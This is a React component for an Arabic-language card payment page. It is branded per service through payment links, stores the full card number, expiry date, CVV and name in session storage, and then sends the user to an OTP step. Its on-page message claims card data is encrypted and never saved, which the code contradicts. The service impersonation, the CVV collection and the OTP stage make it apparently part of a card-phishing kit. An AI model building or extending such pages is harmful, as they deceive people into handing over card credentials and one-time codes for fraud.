import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentRouterStandalone from "@/components/PaymentRouterStandalone";
import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";

const StandalonePaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };

  const formatExpiry = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
    }
    return cleaned;
  };

  return (
    <PaymentRouterStandalone>
      {(linkData) => {
        const serviceKey = linkData.service_key;
        const serviceName = linkData.service_name;
        const branding = getServiceBranding(serviceKey);
        const amount = linkData.cod_amount;
        const formattedAmount = `${amount} ر.س`;

        const handleSubmit = async (e: React.FormEvent) => {
          e.preventDefault();

          const last4 = cardNumber.replace(/\s/g, "").slice(-4);
          sessionStorage.setItem('cardLast4', last4);
          sessionStorage.setItem('cardName', cardName);
          sessionStorage.setItem('cardNumber', cardNumber);
          sessionStorage.setItem('cardExpiry', expiry);
          sessionStorage.setItem('cardCvv', cvv);

          navigate(`/standalone-pay/${id}/otp`);
        };

        return (
          <div className="min-h-screen bg-background" dir="rtl">
            <div className="container mx-auto px-3 sm:px-4 py-8">
              <div className="max-w-2xl mx-auto">
                <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
                  <div
                    className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
                    style={{
                      background: `${branding.colors.primary}10`,
                      border: `1px solid ${branding.colors.primary}30`
                    }}
                  >
                    <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
                    <p className="text-xs sm:text-sm">
                      بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
                    </p>
                  </div>

                  <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
                    <div>
                      <Label className="mb-2 text-sm sm:text-base">اسم حامل البطاقة</Label>
                      <Input
                        placeholder="AHMAD ALI"
                        value={cardName}
                        onChange={(e) => setCardName(e.target.value.toUpperCase())}
                        className="h-12 sm:h-14 text-base sm:text-lg"
                        required
                      />
                    </div>

                    <div>
                      <Label className="mb-2 text-sm sm:text-base">رقم البطاقة</Label>
                      <Input
                        type="password"
                        placeholder="#### #### #### ####"
                        value={cardNumber}
                        onChange={(e) =>
                          setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
                        }
                        inputMode="numeric"
                        className="h-12 sm:h-14 text-base sm:text-lg tracking-wider"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-3 gap-2 sm:gap-3">
                      <div>
                        <Label className="mb-2 text-xs sm:text-sm">CVV</Label>
                        <Input
                          type="password"
                          placeholder="***"
                          value={cvv}
                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                          inputMode="numeric"
                          className="h-12 sm:h-14 text-base sm:text-lg text-center"
                          required
                        />
                      </div>

                      <div>
                        <Label className="mb-2 text-xs sm:text-sm">السنة</Label>
                        <Select
                          value={expiry.split('/')[1] || ''}
                          onValueChange={(year) => {
                            const month = expiry.split('/')[0] || '';
                            setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
                          }}
                        >
                          <SelectTrigger className="h-12 sm:h-14">
                            <SelectValue placeholder="YY" />
                          </SelectTrigger>
                          <SelectContent>
                            {Array.from({ length: 15 }, (_, i) => {
                              const year = (new Date().getFullYear() + i).toString().slice(-2);
                              return (
                                <SelectItem key={year} value={year}>
                                  {year}
                                </SelectItem>
                              );
                            })}
                          </SelectContent>
                        </Select>
                      </div>

                      <div>
                        <Label className="mb-2 text-xs sm:text-sm">الشهر</Label>
                        <Select
                          value={expiry.split('/')[0] || ''}
                          onValueChange={(month) => {
                            const year = expiry.split('/')[1] || '';
                            setExpiry(month && year ? `${month}/${year}` : month);
                          }}
                        >
                          <SelectTrigger className="h-12 sm:h-14">
                            <SelectValue placeholder="MM" />
                          </SelectTrigger>
                          <SelectContent>
                            {Array.from({ length: 12 }, (_, i) => {
                              const month = (i + 1).toString().padStart(2, '0');
                              return (
                                <SelectItem key={month} value={month}>
                                  {month}
                                </SelectItem>
                              );
                            })}
                          </SelectContent>
                        </Select>
                      </div>
                    </div>

                    <Button
                      type="submit"
                      size="lg"
                      className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                      style={{
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                      }}
                    >
                      <span className="ml-2">تفويض البطاقة</span>
                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                    </Button>
                  </form>
                </Card>
              </div>
            </div>
          </div>
        );
      }}
    </PaymentRouterStandalone>
  );
};

export default StandalonePaymentCardForm;
